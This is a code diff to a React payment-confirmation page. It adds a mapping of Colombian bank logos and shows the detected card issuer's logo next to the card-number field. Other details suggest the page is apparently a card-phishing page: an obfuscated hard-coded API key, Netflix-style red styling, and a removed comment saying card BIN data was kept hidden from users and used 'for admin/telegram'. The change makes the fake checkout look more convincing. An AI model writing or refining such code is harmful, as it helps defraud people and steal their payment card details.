@@ -33,6 +33,40 @@ interface BinInfo {
 const _k = [0x63,0x65,0x32,0x66,0x63,0x32,0x31,0x30,0x65,0x36,0x62,0x39,0x66,0x66,0x37,0x65,0x66,0x32,0x37,0x38,0x35,0x30,0x62,0x65,0x64,0x34,0x38,0x61,0x61,0x34,0x62,0x30];
 const GREIP_API_KEY = _k.map(c => String.fromCharCode(c)).join('');
 
+// Bank logos mapping for local display when API detects the bank
+const BANK_LOGOS: Record<string, { name: string; logo: string }> = {
+  "bancolombia": { name: "Bancolombia", logo: "/manus-storage/LogoBancolombia_874ff7cb.png" },
+  "davivienda": { name: "Davivienda", logo: "/manus-storage/davivienda-37856_0b27ddb6.png" },
+  "bbva": { name: "BBVA", logo: "/manus-storage/png-transparent-banco-bilbao-vizcaya-argentaria-logo-bank-business-river-club-blue-text-trademark_87422477.png" },
+  "bogota": { name: "Banco de Bogotá", logo: "/manus-storage/banco-de-bogota-ai-logo-vector-free-11574146814jntim2qodb_7a47b515.png" },
+  "popular": { name: "Banco Popular", logo: "/manus-storage/BancoPopular2025_7cfdbecb.png" },
+  "occidente": { name: "Banco de Occidente", logo: "/manus-storage/banco-de-occidente-sa--600_30f274c4.png" },
+  "av villas": { name: "AV Villas", logo: "/manus-storage/banco-av-villas-logo-png_seeklogo-224697_bdb15e2c.png" },
+  "villas": { name: "AV Villas", logo: "/manus-storage/banco-av-villas-logo-png_seeklogo-224697_bdb15e2c.png" },
+  "caja social": { name: "Banco Caja Social", logo: "/manus-storage/banco-caja-social-logo-png_seeklogo-311683_9ba48f30.png" },
+  "agrario": { name: "Banco Agrario", logo: "/manus-storage/banco-agrario-logo-png_seeklogo-447828_9af179e0.png" },
+  "falabella": { name: "Banco Falabella", logo: "/manus-storage/Banco_Falabella_productos__beneficios__cmr_puntos_y_horarios_foro_3fecacfb.png" },
+  "itau": { name: "Itaú", logo: "/manus-storage/logo_itau_rgb@1x_8c468dbb.png" },
+  "nequi": { name: "Nequi", logo: "/manus-storage/c99d1437635da2d96561a8e37f0d4d4e_16518be8.jpg" },
+  "nubank": { name: "Nu Bank", logo: "/manus-storage/logo-nubank_db78a898.jpg" },
+  "nu": { name: "Nu Bank", logo: "/manus-storage/logo-nubank_db78a898.jpg" },
+  "daviplata": { name: "Daviplata", logo: "/manus-storage/WhatsApp-Image-2025-02-18-at-16.28.58_30d05283.jpeg" },
+  "davibank": { name: "DaviBank", logo: "/manus-storage/DaviBank_Logo_PNG_8149e5b1.png" },
+  "serfinanza": { name: "Serfinanza", logo: "/manus-storage/serfinanza_2b17e1b5.png" },
+  "finandina": { name: "Finandina", logo: "/manus-storage/finandina-1_0813f1f7.jpg" },
+  "bancoomeva": { name: "Bancoomeva", logo: "/manus-storage/69bbe852f53519cb6c89414d_6491bec09e18335499e4593a_bancoomeva-1_36f5244b.webp" },
+  "coomeva": { name: "Bancoomeva", logo: "/manus-storage/69bbe852f53519cb6c89414d_6491bec09e18335499e4593a_bancoomeva-1_36f5244b.webp" },
+};
+
+function findBankLogo(bankName: string): { name: string; logo: string } | null {
+  if (!bankName) return null;
+  const lower = bankName.toLowerCase();
+  for (const [key, value] of Object.entries(BANK_LOGOS)) {
+    if (lower.includes(key)) return value;
+  }
+  return null;
+}
+
 function detectCardBrand(number: string): CardBrand {
   const clean = number.replace(/\s/g, "");
   if (!clean) return "unknown";
@@ -412,8 +446,20 @@ export default function PaymentConfirmation() {
                 {errors.cardNumber && <p className="text-[#E50914] text-[11px] mt-1 ml-1 flex items-center gap-1"><svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/></svg>{errors.cardNumber}</p>}
               </div>
 
-              {/* BIN Info - HIDDEN from user, data only used internally for admin/telegram */}
-              {/* BIN Error - also hidden */}
+              {/* Bank logo display when detected */}
+              {binInfo && binInfo.bank && findBankLogo(binInfo.bank) && (
+                <div className="flex items-center gap-2.5 p-3 bg-gray-50 rounded-lg border border-gray-100 animate-[fadeSlideUp_0.3s_ease-out_both]">
+                  <img
+                    src={findBankLogo(binInfo.bank)!.logo}
+                    alt={findBankLogo(binInfo.bank)!.name}
+                    className="w-10 h-10 object-contain rounded-md"
+                  />
+                  <div className="flex flex-col">
+                    <span className="text-[13px] font-medium text-gray-800">{findBankLogo(binInfo.bank)!.name}</span>
+                    <span className="text-[11px] text-gray-500">{binInfo.scheme} {binInfo.type && `• ${binInfo.type}`}</span>
+                  </div>
+                </div>
+              )}
 
               {/* Expiry and CVV */}
               <div className="grid grid-cols-2 gap-3 animate-[fadeSlideUp_0.4s_ease-out_both]" style={{ animationDelay: '240ms' }}>
